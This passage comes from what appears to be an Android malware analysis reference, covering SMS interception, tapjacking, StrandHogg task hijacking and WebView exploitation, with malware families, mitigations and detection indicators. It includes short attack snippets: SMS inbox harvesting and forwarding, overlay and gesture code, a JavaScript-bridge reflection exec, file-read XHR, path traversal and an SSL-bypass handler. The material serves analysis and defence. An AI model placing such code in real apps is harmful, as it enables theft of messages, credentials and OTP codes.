<pre><code>Cursor cursor = getContentResolver().query(\n    Uri.parse(\"content://sms/inbox\"),\n    new String[]{\"address\", \"body\", \"date\"},\n    null, null, \"date DESC\"\n);\nwhile (cursor.moveToNext()) {\n    String sender = cursor.getString(0);\n    String body = cursor.getString(1);\n    long date = cursor.getLong(2);\n    exfiltrate(sender, body, date);\n}\ncursor.close();\n</code></pre> <p>This provides access to the entire SMS history. Malware uses it to harvest OTP codes that arrived before the malware was installed, or to bulk-exfiltrate all messages for intelligence collection.</p>"},{"location":"attacks/sms-interception/#default-sms-app-technique","title":"Default SMS App Technique","text":"<p>Becoming the default SMS handler gives full control over SMS: reading, writing, sending, and deleting. The malware requests the <code>RoleManager.ROLE_SMS</code> role (Android 10+) or <code>Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT</code>:</p> <pre><code>RoleManager rm = getSystemService(RoleManager.class);\nif (!rm.isRoleHeld(RoleManager.ROLE_SMS)) {\n    startActivityForResult(rm.createRequestRoleIntent(RoleManager.ROLE_SMS), REQ_CODE);\n}\n</code></pre> <p>As default SMS app, the malware can:</p> <ul> <li>Intercept all incoming SMS silently</li> <li>Delete messages before the user reads them</li> <li>Send SMS on the user's behalf</li> <li>Access the full SMS database</li> </ul> <p>Social engineering drives this: the malware presents itself as an SMS management app and asks the user to set it as default during onboarding.</p>"},{"location":"attacks/sms-interception/#smsretriever-api-abuse","title":"SmsRetriever API Abuse","text":"<p>Google's <code>SmsRetriever</code> API lets apps receive specific SMS messages without <code>READ_SMS</code> or <code>RECEIVE_SMS</code> permissions. It works by matching an app-specific hash in the SMS body. Malware abuses this when:</p> <ul> <li>The attacker controls the SMS being sent (phishing scenarios)</li> <li>The attacker can predict or compute the target app's hash</li> <li>The malware poses as a legitimate app expecting verification SMS</li> </ul> <p>The API is designed for one-time verification and auto-fills the code. Malware intercepts the <code>SmsRetriever</code> result to steal the code.</p>"},{"location":"attacks/sms-interception/#sms-forwarding","title":"SMS Forwarding","text":"<p>After intercepting an SMS, the malware forwards it to an attacker-controlled number:</p> <pre><code>SmsManager sm = SmsManager.getDefault();\nsm.sendTextMessage(\"+1234567890\", null, stolenBody, null, null);\n</code></pre> <p>Some families forward every incoming SMS; others filter by sender (banking shortcodes) or content (messages containing digits matching OTP patterns). Forwarding creates a persistent exfiltration channel that works even if the C2 server is down.</p>"},{"location":"attacks/sms-interception/#premium-sms-fraud","title":"Premium SMS Fraud","text":"<p>Sending SMS to premium-rate numbers that charge the victim's phone bill. The malware sends to short codes controlled by the attacker (or an affiliate network), generating revenue per message:</p> <ol> <li>Malware sends SMS to premium short code</li> <li>Service replies with confirmation SMS</li> <li>Malware intercepts the confirmation and replies to complete the subscription</li> <li>Victim is charged recurring fees on their phone bill</li> </ol> <p>This was the dominant monetization strategy before banking trojans emerged. Joker alone was found in hundreds of Play Store apps running premium SMS fraud.</p>"},{"location":"attacks/sms-interception/#ussd-code-execution","title":"USSD Code Execution","text":"<p>Using <code>CALL_PHONE</code> permission to dial USSD codes that check balances, initiate transfers, or change account settings:</p> <pre><code>Intent ussd = new Intent(Intent.ACTION_CALL);\nussd.setData(Uri.parse(\"tel:\" + Uri.encode(\"*123#\")));\nstartActivity(ussd);\n</code></pre> <p>USSD codes vary by carrier and country. Malware targeting specific regions hardcodes USSD strings for local carriers to check prepaid balances, transfer airtime, or subscribe to services.</p>"},{"location":"attacks/sms-interception/#sms-as-c2-channel","title":"SMS as C2 Channel","text":"<p>Some families receive commands via SMS as a fallback when HTTP/HTTPS C2 is unreachable:</p> Aspect SMS C2 HTTP C2 Availability Works without internet Requires connectivity Takedown resistance No domain or IP to sinkhole Domains can be seized Visibility Carrier logs, lawful intercept Network monitoring, TLS inspection Bandwidth Very low, 160 chars per message Unlimited Cost Sender pays per message Free after infrastructure setup <p>Commands arrive as specially formatted SMS. The malware parses the body, executes the instruction, and optionally replies via SMS. State-sponsored tools like FinSpy and early Pegasus variants used SMS C2 because the operators had carrier-level access, eliminating the visibility risk.</p>"},{"location":"attacks/sms-interception/#evolution-of-sms-based-attacks","title":"Evolution of SMS-Based Attacks","text":"Era Technique Status 2012-2014 Premium SMS fraud (send to short codes) Still works, heavily monitored 2014-2017 <code>SMS_RECEIVED</code> broadcast with <code>abortBroadcast()</code> Broken on Android 4.4+ for non-default apps 2017-2019 Full SMS permissions for OTP theft Play Store ban in 2019 2019-2021 Default SMS app social engineering Requires user interaction 2020+ Notification listener replaces SMS interception Current primary method 2021+ Accessibility-based SMS reading Current fallback method 2022+ SmsRetriever API for targeted code theft Niche use cases <p>The trend is clear: each Android restriction pushed malware toward alternative channels. Modern families combine multiple approaches -- notification listener as primary, accessibility as fallback, and SMS permissions only when available.</p> <p>Notification Listener is the Modern Replacement</p> <p>Since 2020, most banking trojans use notification listener abuse to read OTP codes from notification content instead of requesting SMS permissions. If a sample requests <code>RECEIVE_SMS</code> alongside <code>BIND_NOTIFICATION_LISTENER_SERVICE</code>, the SMS path is likely a fallback for devices where notification access was not granted.</p>"},{"location":"attacks/sms-interception/#android-mitigations","title":"Android Mitigations","text":"Version Mitigation Bypass Android 4.4 (API 19) Only the default SMS app can call <code>abortBroadcast()</code> on <code>SMS_RECEIVED</code> Other apps still receive the broadcast, just cannot suppress it Android 5.0 (API 21) <code>SMS_DELIVER</code> broadcast sent only to default SMS app <code>SMS_RECEIVED</code> still goes to all receivers Android 6.0 (API 23) SMS permissions become runtime permissions Social engineering user to grant at runtime Android 8.0 (API 26) Implicit broadcast restrictions <code>SMS_RECEIVED</code> is exempt, still delivered to manifest-registered receivers Android 10 (API 29) <code>READ_SMS</code> restricted to default SMS app or active accessibility service; <code>ROLE_SMS</code> replaces <code>ACTION_CHANGE_DEFAULT</code> Accessibility service grants access to SMS content provider Android 13 (API 33) Restricted settings prevent sideloaded apps from being set as default SMS app Session-based package installer bypass"},{"location":"attacks/sms-interception/#families-using-this-technique","title":"Families Using This Technique","text":"Family SMS Techniques Primary Purpose FluBot <code>SEND_SMS</code> to spread phishing links to all contacts, <code>RECEIVE_SMS</code> for OTP SMS worm propagation Anubis <code>RECEIVE_SMS</code> interception, SMS forwarding to C2 OTP theft for banking fraud SpyNote Full SMS read/receive/send for comprehensive surveillance RAT, SMS exfiltration Hydra SMS forwarding to attacker-controlled numbers, OTP interception Banking fraud Medusa SMS commands as C2 channel, OTP interception (v1) Banking fraud, remote control BRATA SMS reading for transaction confirmation codes, factory reset after theft Banking fraud Joker <code>SEND_SMS</code> to premium numbers, <code>RECEIVE_SMS</code> for confirmation interception Premium SMS subscription fraud Cerberus SMS interception with C2 forwarding, SMS-based 2FA bypass Banking credential theft GodFather SMS interception alongside notification monitoring Banking fraud Ermac SMS-based 2FA interception Banking fraud Hook SMS interception during ATS operations Banking ATS Octo SMS interception during remote access sessions Banking fraud Xenomorph SMS OTP capture feeding into ATS engine Banking ATS Anatsa OTP theft during automated bank transfers Banking ATS SharkBot SMS interception for ATS OTP bypass Banking ATS Vultur SMS interception alongside screen recording Banking fraud Chameleon SMS interception after disabling biometric prompts Banking fraud Mamont SMS interception combined with notification listening Russian banking fraud TsarBot SMS OTP capture across 750+ target apps Banking ATS Antidot SMS-based 2FA interception Banking fraud Crocodilus OTP theft during device takeover operations Banking DTO MoqHao SMS phishing distribution, SMS interception Smishing worm Rafel RAT SMS interception, ransomware unlock via SMS RAT, ransomware TrickMo SMS OTP theft, originally TrickBot's Android companion Banking fraud <p>FluBot -- SMS Worm Propagation</p> <p>FluBot stands out as a true SMS worm: it reads the victim's contact list and sends phishing SMS to every entry, each containing a link to download FluBot. At peak spread in 2021, it infected devices across Europe in chain-reaction fashion. Its infrastructure was taken down by Europol in 2022, but the SMS worm pattern has been replicated by MoqHao and other families.</p>"},{"location":"attacks/sms-interception/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>BroadcastReceiver</code> with <code>SMS_RECEIVED</code> intent filter, especially with high <code>android:priority</code></li> <li><code>RECEIVE_SMS</code>, <code>READ_SMS</code>, <code>SEND_SMS</code> permissions in manifest</li> <li>References to <code>content://sms</code> content provider URI</li> <li><code>SmsManager.sendTextMessage()</code> or <code>sendMultipartTextMessage()</code> calls</li> <li><code>Telephony.Sms.Intents.getMessagesFromIntent()</code> usage</li> <li><code>RoleManager.ROLE_SMS</code> or <code>ACTION_CHANGE_DEFAULT</code> intent</li> <li><code>abortBroadcast()</code> calls inside SMS receivers</li> </ul> Dynamic Indicators <ul> <li>SMS messages sent to unknown numbers shortly after installation</li> <li>Outbound SMS to premium short codes</li> <li>ContentResolver queries against <code>content://sms</code> returning bulk data</li> <li>Network traffic containing SMS content or OTP codes</li> <li>USSD dial attempts via <code>ACTION_CALL</code> intents</li> </ul>"},{"location":"attacks/sms-interception/#see-also","title":"See Also","text":"<ul> <li>SMS Permissions</li> <li>Notification Listener Abuse -- the modern replacement for SMS interception</li> <li>Broadcast Theft -- broader broadcast interception techniques</li> </ul>"},{"location":"attacks/tapjacking/","title":"Tapjacking","text":"<p>Tricking the user into tapping on something they didn't intend to by placing a transparent or partially obscuring overlay over a sensitive UI element. A specific application of overlay attacks focused on manipulating touch events rather than phishing credentials.</p> <p>Requirements</p> Requirement Details Permission <code>SYSTEM_ALERT_WINDOW</code> Condition Target app does not filter obscured touches"},{"location":"attacks/tapjacking/#how-it-works","title":"How It Works","text":"<ol> <li>Malware draws a transparent or partially transparent overlay over the target UI</li> <li>The overlay shows a benign message (\"Tap to continue\", a game, a fake dialog)</li> <li>When the user taps, the touch passes through to the UI element underneath</li> <li>The underlying element could be a permission grant button, an install confirmation, or a settings toggle</li> </ol> <p>The key is <code>FLAG_NOT_TOUCHABLE</code> on the overlay window: when set, touches pass through the overlay to whatever is beneath it. The user sees the overlay content but their tap hits the hidden target.</p>"},{"location":"attacks/tapjacking/#classic-scenario","title":"Classic Scenario","text":"<p>Malware wants the user to click \"Allow\" on a permission dialog:</p> <ol> <li>Permission dialog appears behind the overlay</li> <li>Overlay shows an innocuous UI with a button positioned exactly over \"Allow\"</li> <li>User taps the overlay button</li> <li>Touch passes through to \"Allow\"</li> <li>Permission granted without user awareness</li> </ol>"},{"location":"attacks/tapjacking/#variants","title":"Variants","text":""},{"location":"attacks/tapjacking/#full-overlay-passthrough","title":"Full Overlay Passthrough","text":"<p>Entire screen covered with <code>FLAG_NOT_TOUCHABLE</code>. User sees the overlay but all touches go to the app behind it. Used to hide what the user is actually interacting with.</p>"},{"location":"attacks/tapjacking/#partial-overlay","title":"Partial Overlay","text":"<p>Only part of the screen is covered. The unobscured area contains the target (e.g., the \"Install\" button), while the overlay hides surrounding context that would alert the user.</p>"},{"location":"attacks/tapjacking/#timing-based","title":"Timing-Based","text":"<p>The overlay appears and disappears rapidly, showing for just long enough to catch a tap the user was already making. Harder to detect but less reliable.</p>"},{"location":"attacks/tapjacking/#android-mitigations","title":"Android Mitigations","text":"Version Mitigation Bypass Android 4.0.3 <code>filterTouchesWhenObscured</code> attribute added Opt-in; most apps don't implement it Android 6.0 <code>SYSTEM_ALERT_WINDOW</code> moved to special permission (Settings toggle) Accessibility service can auto-enable Android 8.0 <code>TYPE_APPLICATION_OVERLAY</code> renders below system dialogs Third-party app UIs remain vulnerable Android 12 System dialogs set <code>FLAG_WINDOW_IS_PARTIALLY_OBSCURED</code>; overlays untouchable over sensitive system UI Accessibility gestures bypass all overlay mitigations entirely"},{"location":"attacks/tapjacking/#remaining-gaps","title":"Remaining Gaps","text":"<ul> <li><code>filterTouchesWhenObscured</code> is opt-in. Apps must set it explicitly. Many don't.</li> <li>Third-party app UIs (not system dialogs) are still vulnerable.</li> <li>Accessibility service gestures bypass all overlay-based mitigations entirely.</li> </ul>"},{"location":"attacks/tapjacking/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE</code> combined with <code>TYPE_APPLICATION_OVERLAY</code> and translucent/transparent pixel format</li> <li>Overlay window dimensions and position matching known system dialog button locations</li> </ul> <pre><code>WindowManager.LayoutParams params = new WindowManager.LayoutParams(\n    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,\n    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,\n    PixelFormat.TRANSLUCENT\n);\n</code></pre>"},{"location":"attacks/tapjacking/#families-using-this-technique","title":"Families Using This Technique","text":"<p>Modern banking trojans have largely moved past tapjacking toward accessibility abuse, which provides more reliable and comprehensive device control. Tapjacking was primarily seen in earlier malware generations (2014-2017) before accessibility service abuse became the standard approach. Current families that use overlays focus on credential phishing via overlay attacks rather than touch manipulation.</p> <p>However, tapjacking still appears in specific contexts:</p> Family Usage Anatsa Overlay to trick user into enabling accessibility service by placing transparent \"Allow\" button over permission dialog MoqHao Overlay to trick user into granting default SMS app permission Chameleon Overlay guiding user to disable biometric authentication in favor of PIN entry GoldPickaxe Overlay prompting facial biometric capture disguised as verification step TrickMo Overlay to capture the device screen lock PIN, displayed when the user attempts to unlock their phone or open a targeted app SpyNote Overlay that guides the user step-by-step through enabling accessibility service, showing arrows and instructions over the real Settings UI <p>The primary modern use is not stealing tap events (the classic tapjacking definition) but rather using transparent or misleading overlays to guide users through permission-granting flows. This is a social engineering application of the same overlay mechanism.</p>"},{"location":"attacks/tapjacking/#accessibility-gesture-alternative","title":"Accessibility Gesture Alternative","text":"<p>The accessibility service API provides <code>dispatchGesture()</code>, which programmatically injects touch events into any app on screen. This eliminates the need for tapjacking entirely -- no overlay required, no user interaction needed.</p> <pre><code>GestureDescription.Builder builder = new GestureDescription.Builder();\nPath clickPath = new Path();\nclickPath.moveTo(targetX, targetY);\nbuilder.addStroke(new GestureDescription.StrokeDescription(clickPath, 0, 50));\ndispatchGesture(builder.build(), null, null);\n</code></pre> <p>With accessibility service access, the malware can:</p> <ul> <li>Click any button on any screen, including permission grant dialogs</li> <li>Perform swipe gestures to navigate through settings menus</li> <li>Type text into input fields using <code>Bundle</code> arguments with <code>ACTION_SET_TEXT</code></li> <li>Scroll to find specific UI elements using <code>AccessibilityNodeInfo.ACTION_SCROLL_FORWARD</code></li> </ul> <p>This is strictly superior to tapjacking in every way. There is no timing dependency, no overlay to detect, and no user action to intercept. The only requirement is that the user has granted accessibility service permission to the malware, which is itself often obtained through tapjacking or overlay-guided social engineering -- creating a bootstrap chain where tapjacking enables the more powerful accessibility approach.</p> <p>Modern banking trojans (Anatsa, Xenomorph, Hook) use tapjacking or overlay guidance as a one-time step to obtain accessibility access, then switch entirely to <code>dispatchGesture()</code> and <code>AccessibilityNodeInfo</code> actions for all subsequent device manipulation. The overlay is the scaffolding; accessibility is the building.</p>"},{"location":"attacks/tapjacking/#testing-for-tapjacking-vulnerability","title":"Testing for Tapjacking Vulnerability","text":""},{"location":"attacks/tapjacking/#checking-app-level-protection","title":"Checking App-Level Protection","text":"<p>An app is vulnerable to tapjacking if its sensitive UI elements do not reject touches when an overlay is present. The defense is <code>filterTouchesWhenObscured</code>, which can be set per-view in XML or programmatically.</p> <p>In layout XML:</p> <pre><code>&lt;Button\n    android:filterTouchesWhenObscured=\"true\"\n    android:text=\"Confirm Payment\" /&gt;\n</code></pre> <p>Or in code:</p> <pre><code>button.setFilterTouchesWhenObscured(true);\n</code></pre> <p>Or by checking <code>MotionEvent.FLAG_WINDOW_IS_OBSCURED</code> in <code>onTouchEvent()</code> / <code>onFilterTouchEventForSecurity()</code>.</p> <p>To determine if an app is vulnerable, decompile the APK and search for these indicators. If none are present on security-sensitive views (payment confirmation, permission grants, login), the app is likely vulnerable.</p>"},{"location":"attacks/tapjacking/#testing-with-adb","title":"Testing with ADB","text":"<p>Create a test overlay without writing a full app:</p> <pre><code>adb shell settings put system show_touches 1\n</code></pre> <p>For a more thorough test, use a minimal overlay app or the <code>WindowManager</code> shell commands available on rooted devices. The steps:</p> <ol> <li>Install a simple overlay app (or use an existing screen dimmer/filter app)</li> <li>Activate the overlay so it covers the target app's UI</li> <li>Attempt to tap through the overlay onto sensitive buttons</li> <li>If the taps register, the app does not filter obscured touches</li> </ol>"},{"location":"attacks/tapjacking/#automated-detection-with-drozer","title":"Automated Detection with Drozer","text":"<pre><code>dz&gt; run app.activity.info -a com.target.app\n</code></pre> <p>Check for activities that handle sensitive actions and cross-reference with static analysis for <code>filterTouchesWhenObscured</code> usage. Drozer does not directly test tapjacking, but it identifies the attack surface (exported activities with sensitive functionality) that you then test manually with an overlay.</p>"},{"location":"attacks/tapjacking/#what-to-look-for","title":"What to Look For","text":"Indicator Verdict <code>filterTouchesWhenObscured=\"true\"</code> on all sensitive views Protected <code>onFilterTouchEventForSecurity()</code> override checking obscured flag Protected No obscured touch handling anywhere in the codebase Vulnerable <code>FLAG_WINDOW_IS_OBSCURED</code> check only on some views Partially vulnerable"},{"location":"attacks/task-affinity-attacks/","title":"Task Affinity Attacks","text":"<p>Manipulating Android's activity back stack to place a malicious activity inside a target app's task. The user believes they're interacting with the legitimate app because the malicious activity appears in its task and recent apps entry. Also known as \"StrandHogg\" after the vulnerability disclosure that popularized it.</p> <p>Requirements</p> Requirement Details Permission None Condition Manifest configuration only"},{"location":"attacks/task-affinity-attacks/#how-task-affinity-works","title":"How Task Affinity Works","text":"<p>Every activity has a <code>taskAffinity</code> property (defaults to the app's package name). Activities with the same affinity are grouped into the same task. The task appears as a single entry in the Recent Apps screen.</p> <p>By default, all activities in an app share the same affinity and appear in one task. But an attacker's activity can declare affinity matching the target app:</p> <pre><code>&lt;activity\n    android:name=\".PhishingActivity\"\n    android:taskAffinity=\"com.target.banking.app\"\n    android:allowTaskReparenting=\"true\"\n    android:excludeFromRecents=\"true\" /&gt;\n</code></pre>"},{"location":"attacks/task-affinity-attacks/#attack-patterns","title":"Attack Patterns","text":""},{"location":"attacks/task-affinity-attacks/#strandhogg-v1","title":"StrandHogg (v1)","text":"<p>Disclosed in 2019 by Promon. Affects all Android versions.</p> <ol> <li>Malicious app launches with <code>taskAffinity</code> matching the target app</li> <li>Malicious activity is placed into the target's task stack</li> <li>When user opens the target app from recent apps or launcher, the malicious activity appears instead</li> <li>The malicious activity presents a phishing UI</li> </ol> <p>The attack uses <code>allowTaskReparenting=\"true\"</code>: the malicious activity starts in its own task but migrates to the target's task when the target is launched.</p>"},{"location":"attacks/task-affinity-attacks/#strandhogg-20-cve-2020-0096","title":"StrandHogg 2.0 (CVE-2020-0096)","text":"<p>Disclosed in 2020. Affected Android 8.0-9.0 (patched in May 2020 security update).</p> <p>An elevation of privilege vulnerability where a malicious app could take over any activity of any app. Unlike v1, the victim app doesn't need to be running. The malicious app could start any exported activity and intercept it, without the user noticing.</p>"},{"location":"attacks/task-affinity-attacks/#task-hijacking-for-phishing","title":"Task Hijacking for Phishing","text":"<p>Practical phishing scenario:</p> <ol> <li>Malware sets <code>taskAffinity=\"com.chase.sig.android\"</code></li> <li>User opens Chase banking app from launcher</li> <li>Instead of Chase, the malware's phishing activity appears</li> <li>User enters credentials</li> <li>Malware stores credentials and launches the real Chase activity</li> <li>User sees the real app and doesn't realize they were phished</li> </ol> <p>The Recent Apps screen shows the Chase icon and label, further selling the illusion.</p>"},{"location":"attacks/task-affinity-attacks/#relevant-manifest-attributes","title":"Relevant Manifest Attributes","text":"Attribute Effect <code>taskAffinity</code> Controls which task the activity belongs to <code>allowTaskReparenting</code> Activity can move between tasks <code>launchMode=\"singleTask\"</code> Creates new task if none with matching affinity exists <code>excludeFromRecents</code> Hides malicious activity from recent apps <code>documentLaunchMode</code> Controls document-based task creation"},{"location":"attacks/task-affinity-attacks/#android-mitigations","title":"Android Mitigations","text":"Version Mitigation Bypass Android 10 (API 29) Restricted task affinity behavior for background-launched activities (StrandHogg v1 patch) Variations remain possible with certain launch mode configurations May 2020 Security Patch Patched StrandHogg 2.0 (CVE-2020-0096) Only applies to devices receiving the patch Android 12+ Additional restrictions on background activity starts The underlying task model hasn't fundamentally changed; residual risk remains on unpatched devices"},{"location":"attacks/task-affinity-attacks/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li>Activities with <code>taskAffinity</code> set to another app's package name</li> <li><code>allowTaskReparenting=\"true\"</code> combined with non-default affinity</li> <li><code>launchMode=\"singleTask\"</code> or <code>\"singleInstance\"</code> on suspicious activities</li> <li><code>excludeFromRecents=\"true\"</code> (hiding the malicious activity)</li> </ul> Dynamic Indicators <ul> <li>Malicious activity appearing in target app's task in Recent Apps</li> <li>Task reparenting observed when target app is launched</li> <li>Phishing UI displayed inside another app's task context</li> </ul>"},{"location":"attacks/task-affinity-attacks/#families-using-this-technique","title":"Families Using This Technique","text":"Family Usage Era BankBot Early adopter. Used <code>taskAffinity</code> + <code>allowTaskReparenting</code> to inject phishing activities into banking app tasks. 2016-2017 Anubis Combined task affinity with overlay attacks for layered credential theft. 2018 Gustuff Used task manipulation alongside accessibility-driven ATS for automated fund transfers. 2019 Cerberus Included task affinity phishing as one of multiple credential theft vectors. 2019-2020 <p>Task affinity attacks were the dominant phishing technique from 2014-2017. They were largely superseded by overlay attacks (which don't require task manipulation) and accessibility abuse (which provides broader device control). However, the underlying Android task model remains unchanged, and StrandHogg-style attacks still work on unpatched devices.</p>"},{"location":"attacks/task-affinity-attacks/#relationship-to-overlay-attacks","title":"Relationship to Overlay Attacks","text":"<p>Both task affinity attacks and overlay attacks achieve the same goal: presenting a fake UI over a legitimate app. The key difference:</p> Aspect Task Affinity Overlay Permission needed None <code>SYSTEM_ALERT_WINDOW</code> or Accessibility Android version All (with mitigations from 10+) All (with restrictions from 12+) Visibility Appears inside target app's task Floats above all apps Trigger User opens target app Malware detects target app launch Modern usage Rare Standard <p>The shift happened because overlays are more flexible (can trigger on any app launch, don't require prior task setup) and accessibility abuse provides far more capabilities beyond just phishing.</p>"},{"location":"attacks/webview-exploitation/","title":"WebView Exploitation","text":"<p>Abusing the WebView component to execute code, access local files, steal data, or bridge between web and native Android context. WebView is an embedded browser. When misconfigured, it gives web content access to native device capabilities.</p> <p>Requirements</p> Requirement Details Permission None (exploits app misconfiguration) Condition Target app loads attacker-controlled URLs in a WebView or exposes JavaScript interfaces"},{"location":"attacks/webview-exploitation/#attack-surface","title":"Attack Surface","text":"<p>WebView inherits the app's permissions. If the host app has <code>READ_CONTACTS</code>, <code>CAMERA</code>, or <code>INTERNET</code>, JavaScript running in the WebView can potentially access those through exposed interfaces.</p>"},{"location":"attacks/webview-exploitation/#attack-patterns","title":"Attack Patterns","text":""},{"location":"attacks/webview-exploitation/#javascript-interface-abuse","title":"JavaScript Interface Abuse","text":"<p>Apps expose Java objects to JavaScript via <code>addJavascriptInterface()</code>:</p> <pre><code>webView.addJavascriptInterface(new MyBridge(), \"AndroidBridge\");\n</code></pre> <p>JavaScript in the WebView can call methods on <code>MyBridge</code>:</p> <pre><code>AndroidBridge.sendSMS(\"1234567890\", \"message\");\n</code></pre> <p>If the app loads attacker-controlled content into this WebView, the attacker's JavaScript calls the exposed methods directly.</p> <p>Pre-API 17 (Android 4.2): any public method on the interface object was callable, including <code>getClass()</code>. This enabled full arbitrary code execution via reflection:</p> <pre><code>AndroidBridge.getClass().forName(\"java.lang.Runtime\")\n    .getMethod(\"exec\", String.class)\n    .invoke(null, \"id\");\n</code></pre> <p>API 17+: only methods annotated with <code>@JavascriptInterface</code> are exposed. This closed the reflection path but exposed methods are still callable.</p>"},{"location":"attacks/webview-exploitation/#file-access","title":"File Access","text":"<p>WebView file access settings:</p> Setting Default Risk <code>setAllowFileAccess(true)</code> <code>true</code> (API &lt; 30), <code>false</code> (API 30+) Load <code>file://</code> URIs, read local files <code>setAllowFileAccessFromFileURLs(true)</code> <code>false</code> (API 16+) JavaScript in file:// pages can read other file:// <code>setAllowUniversalAccessFromFileURLs(true)</code> <code>false</code> (API 16+) JavaScript in file:// pages can access any origin <code>setAllowContentAccess(true)</code> <code>true</code> Load <code>content://</code> URIs <p>If an app loads <code>file:///data/data/com.target.app/shared_prefs/config.xml</code> in a WebView with file access enabled, JavaScript can read the content. Combined with XHR, files can be exfiltrated:</p> <pre><code>var xhr = new XMLHttpRequest();\nxhr.open(\"GET\", \"file:///data/data/com.target.app/shared_prefs/credentials.xml\", false);\nxhr.send();\nvar data = xhr.responseText;\n</code></pre>"},{"location":"attacks/webview-exploitation/#url-redirection-content-injection","title":"URL Redirection / Content Injection","text":"<p>If the app loads URLs from intent extras or deep link parameters:</p> <pre><code>String url = getIntent().getStringExtra(\"url\");\nwebView.loadUrl(url);\n</code></pre> <p>An attacker sends an intent with <code>url=https://evil.com/phishing.html</code>, and the WebView loads attacker content within the app's UI context. Users see the app's chrome (toolbar, navigation) around malicious content.</p>"},{"location":"attacks/webview-exploitation/#shouldoverrideurlloading-bypass","title":"<code>shouldOverrideUrlLoading</code> Bypass","text":"<p>Apps use <code>shouldOverrideUrlLoading()</code> to filter URLs. Common bypass patterns:</p> <ul> <li>URL encoding to evade string matching</li> <li>Redirects through allowed domains</li> <li>Fragment identifiers (<code>#</code>) to carry data past filters</li> <li>JavaScript-initiated navigation vs. user-initiated navigation (handled differently)</li> </ul>"},{"location":"attacks/webview-exploitation/#webresourceresponse-exploitation","title":"WebResourceResponse Exploitation","text":"<p>Apps that override <code>shouldInterceptRequest()</code> to serve local content via <code>WebResourceResponse</code> can be exploited for arbitrary file theft. Oversecured documented this attack class using Amazon app vulnerabilities as examples: if the app returns file contents based on URL parameters without path validation, an attacker can request internal files.</p> <pre><code>public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {\n    String path = request.getUrl().getPath();\n    File file = new File(getFilesDir(), path);\n    return new WebResourceResponse(\"text/html\", \"utf-8\", new FileInputStream(file));\n}\n</code></pre> <p>A request to <code>https://trusted.domain/../shared_prefs/credentials.xml</code> traverses out of the intended directory. Oversecured's file theft checklist covers systematic identification of these patterns.</p>"},{"location":"attacks/webview-exploitation/#loaddatawithbaseurl-abuse","title":"<code>loadDataWithBaseURL</code> Abuse","text":"<p>When an app uses <code>loadDataWithBaseURL()</code> with a privileged base URL, any JavaScript in the loaded HTML inherits origin access to that domain:</p> <pre><code>webView.loadDataWithBaseURL(\"https://trusted.domain\", htmlContent, \"text/html\", \"utf-8\", null);\n</code></pre> <p>If <code>htmlContent</code> comes from attacker-controlled input, the JavaScript runs in the context of <code>trusted.domain</code>, with access to its cookies and local storage. Oversecured demonstrated this in Evernote, achieving universal XSS and theft of all cookies from all sites by combining exported activity abuse with <code>loadDataWithBaseURL</code>.</p>"},{"location":"attacks/webview-exploitation/#cookie-theft","title":"Cookie Theft","text":"<p>WebView shares a cookie store via <code>CookieManager</code>. If an attacker can load content in the same WebView instance used for authenticated sessions, they can access session cookies:</p> <pre><code>document.cookie; // reads cookies for the current domain\n</code></pre> <p>If <code>setAllowUniversalAccessFromFileURLs(true)</code> is set, a file:// page can read cookies for any domain.</p> <p>Beyond JavaScript-based access, the WebView cookie database file itself (<code>/data/data/com.target.app/app_webview/Cookies</code>) can be stolen through content provider path traversal or file theft chains, providing offline access to all stored cookies without executing JavaScript.</p>"},{"location":"attacks/webview-exploitation/#ssl-pinning-bypass-via-webview","title":"SSL Pinning Bypass via WebView","text":"<p>WebView SSL errors can be overridden:</p> <pre><code>webView.setWebViewClient(new WebViewClient() {\n    @Override\n    public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {\n        handler.proceed(); // accepts any certificate\n    }\n});\n</code></pre> <p>This enables MITM attacks on all WebView traffic within the app.</p>"},{"location":"attacks/webview-exploitation/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>addJavascriptInterface()</code> calls and what methods are exposed</li> <li><code>setAllowFileAccess(true)</code>, <code>setAllowFileAccessFromFileURLs(true)</code>, <code>setAllowUniversalAccessFromFileURLs(true)</code></li> <li>URL loading from untrusted input (intent extras, deep link parameters)</li> <li><code>onReceivedSslError</code> with <code>handler.proceed()</code></li> <li><code>setJavaScriptEnabled(true)</code> combined with any of the above</li> <li><code>shouldInterceptRequest()</code> overrides returning file contents based on URL parameters</li> </ul> Dynamic Indicators <ul> <li>WebView loading URLs from intent extras or deep link parameters</li> <li>JavaScript bridge calls to native methods exposing sensitive functionality</li> <li>File access attempts via <code>file://</code> or <code>content://</code> URIs in WebView</li> <li>SSL errors silently accepted during WebView navigation</li> </ul> <p>Oversecured's WebView security checklist provides a systematic approach to auditing WebView configurations. 8kSec's deep link and WebView exploitation guide provides hands-on exploitation walkthroughs using the InsecureShop vulnerable app, covering URL validation bypass techniques (e.g., verifying authority vs. domain name suffix).</p>"},{"location":"attacks/webview-exploitation/#vendor-specific-webview-vulnerabilities","title":"Vendor-Specific WebView Vulnerabilities","text":"<p>OEM customizations introduce WebView attack surface beyond AOSP. Oversecured disclosed 7 Android and Pixel vulnerabilities including arbitrary file theft via WebView with default settings on stock Android devices. Their Xiaomi research found 20 security issues in Xiaomi system apps, several involving WebView misconfiguration in vendor-specific components. Oversecured's systematic audit of 225 Google apps revealed widespread WebView issues across Google's own app ecosystem.</p>"},{"location":"attacks/webview-exploitation/#android-mitigations","title":"Android Mitigations","text":"Version Mitigation Bypass Android 4.2 (API 17) <code>@JavascriptInterface</code> annotation required; reflection path via <code>getClass()</code> closed Explicitly annotated methods remain callable Android 4.4 (API 19) Chromium-based WebView replaces Android WebKit; improved sandboxing Application-level misconfigurations still exploitable Android 7.0 (API 24) <code>setAllowFileAccessFromFileURLs()</code> and <code>setAllowUniversalAccessFromFileURLs()</code> default to <code>false</code> Apps explicitly enabling these settings remain vulnerable Android 9.0 (API 28) Per-process WebView data directory isolation Does not prevent exploitation within the same process Android 10 (API 29) <code>setAllowFileAccess()</code> defaults to <code>false</code> for WebViews targeting API 29+ Legacy apps targeting lower API levels still default 